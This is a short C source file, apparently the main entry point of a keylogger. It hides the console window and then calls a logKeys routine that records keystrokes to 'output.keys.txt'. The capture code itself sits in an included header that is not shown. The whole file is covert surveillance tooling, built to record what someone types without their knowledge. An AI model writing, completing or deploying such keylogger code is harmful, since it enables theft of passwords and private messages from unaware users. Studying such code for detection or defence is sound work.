#include <stdio.h>

#include "keyLogger.h"

#define OUTPUT_FILE_NAME "output.keys.txt"


const errno_t main(void)
{
    hideConsoleWindow();

    const errno_t err = logKeys(OUTPUT_FILE_NAME);
    if (err) return err;

    return 0;
}
